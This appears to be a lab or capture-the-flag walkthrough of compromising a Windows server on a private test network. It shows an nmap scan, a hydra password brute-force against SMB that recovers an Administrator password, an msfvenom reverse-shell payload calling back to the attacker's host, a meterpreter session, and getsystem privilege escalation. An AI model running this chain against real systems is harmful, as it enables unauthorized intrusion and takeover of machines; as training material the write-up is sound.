## IP: `192.168.100.55`
## OS: Windows

```bash
# Nmap 7.92 scan initiated Mon Sep  8 20:49:37 2025 as: nmap -sV -T4 -oN Target_4/nmap-service-detection-scan.txt target4.local
Nmap scan report for target4.local (192.168.100.55)
Host is up (0.0012s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
MAC Address: 02:40:87:4F:8A:DF (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep  8 20:49:54 2025 -- 1 IP address (1 host up) scanned in 16.61 seconds

```

## Port 80 (IIS)

## Port 445 (SMB)

```bash
┌──(rootkali)-[~/Target_4]
└─# hydra -l Administrator -P ~/rockyou.txt 192.168.100.55 smb -t 10                                                                      255 ⨯
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 20:51:56
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking smb://192.168.100.55:445/
[445][smb] host: 192.168.100.55   login: Administrator   password: swordfish
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-08 20:52:14

```

- Found Credentials: Username: `Administrator` & Password: `swordfish`

## Port 3389 (RDP)

Using the same smb creds we got access to RDP

![[Pasted image 20250908211420.png]]

Let's generate a payload and get a reverse shell.

```bash
┌──(rootkali)-[~]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.5 LPORT=9001 -f exe -o shell.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe

```

```bash
root@kali:~# msfconsole -q
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
^[OMmsf6 exploit(multi/handler) > set LHOST eth0
LHOST => eth0
msf6 exploit(multi/handler) > ip a s
[*] exec: ip a s

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
    link/ether 02:d3:17:d9:f2:cf brd ff:ff:ff:ff:ff:ff
    inet 192.168.100.5/24 brd 192.168.100.255 scope global dynamic eth0
       valid_lft 3444sec preferred_lft 3444sec
    inet6 fe80::d3:17ff:fed9:f2cf/64 scope link 
       valid_lft forever preferred_lft forever
msf6 exploit(multi/handler) > set LPORT 9001
LPORT => 9001
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.100.5:9001 
[*] Sending stage (175174 bytes) to 192.168.100.55
[*] Meterpreter session 1 opened (192.168.100.5:9001 -> 192.168.100.55:51748 ) at 2025-09-08 21:12:31 +0530

meterpreter > Interrupt: use the 'exit' command to quit
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.168.100.55 - Meterpreter session 1 closed.  Reason: User exit
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.100.5:9001 
[*] Sending stage (175174 bytes) to 192.168.100.55
[*] Meterpreter session 2 opened (192.168.100.5:9001 -> 192.168.100.55:51754 ) at 2025-09-08 21:12:46 +0530

meterpreter > whoami
[-] Unknown command: whoami
meterpreter > getuid
Server username: WINSERVER-03\Administrator
meterpreter > 

```

Let's escalate our priviledges.

```bash
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

We have Full control 


![[Pasted image 20250908211701.png]]

Okay, so this machine is connected to internal network

## Port 8080 (HttpFileServer httpd 2.3m)

Vulnerable but we are not going to exploit because as we have already maintain persistence 


